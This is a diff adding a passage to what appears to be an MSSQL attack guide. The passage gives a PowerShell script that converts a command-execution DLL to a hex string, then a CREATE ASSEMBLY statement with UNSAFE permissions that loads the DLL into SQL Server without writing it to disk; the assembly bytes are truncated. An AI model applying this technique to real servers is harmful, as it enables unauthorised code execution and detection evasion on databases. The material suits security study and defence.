@@ -214,6 +214,22 @@ In order to avoid to put our DLL on disk, we can convert it to hexadecimal and u
 To convert our DLL to an hexadecimal string we will use this powershell script:
 
 ```
+$assemblyFile = "C:\cmdExec.dll"
+$stringBuilder = New-Object -Type System.Text.StringBuilder 
+$fileStream = [IO.File]::OpenRead($assemblyFile)
+
+while (($byte = $fileStream.ReadByte()) -gt -1)
+{
+  $stringBuilder.Append($byte.ToString("X2")) | Out-Null
+}
+
+$stringBuilder.ToString() -join "" | Out-File c:\Tools\cmdExec.txt
+```
+
+Now we will create our assembly using the following statement:
+
+```
+CREATE ASSEMBLY my_assembly FROM 0x4D5A900..... WITH PERMISSION_SET = UNSAFE;
 ```
 
 **CODE EXECUTION ON A LINKED MSSQL SERVER:**
